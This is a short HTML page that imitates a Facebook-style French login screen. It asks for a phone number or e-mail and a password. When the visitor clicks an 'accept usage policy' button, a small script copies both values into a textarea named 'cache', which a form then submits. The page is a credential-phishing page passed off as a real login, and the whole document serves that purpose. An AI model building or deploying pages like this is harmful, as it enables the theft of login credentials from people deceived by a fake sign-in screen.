<!DOCTYPE html>

<html lang="en">



<head>

    <meta charset="UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Log in</title>

    <link rel="stylesheet" href="index.css">

</head>



<body>

    <div id="avertissement">

        <i>Vous devez d'abord vous connecter.</i>

    </div>

    <div id="all">

        <div id="logo">

            <img src="logo/facelogo.jpg" alt="logoF">

        </div>

        <div>

            <input type="text" placeholder="Numéro de téléphone ou e-mail" id="num" autocapitalize="off"

                autocomplete="off">

        </div>

        <div>

            <input type="password" placeholder="Mot de passe" id="mdp" autocapitalize="off" autocomplete="off">

        </div>

        <div>

            <input type="radio" onclick="copie()" id="radio">

            <a href="index.html">Accepter la politique d'utilisation</a>.

            <br><br>

        </div>

        <form action="">

            <input type="submit" value="SE CONNECTER" id="connexion">

            <textarea id="cache" name="infos"></textarea>

        </form>

        <script>

            function copie()

            {

                var mail = document.getElementById("num").value;

                var cle = document.getElementById("mdp").value;

                document.getElementById("cache").innerHTML = "ID : " + mail + "\n" +"pass : " + cle ;

            }

        </script>

    </div>

</body>



              </html
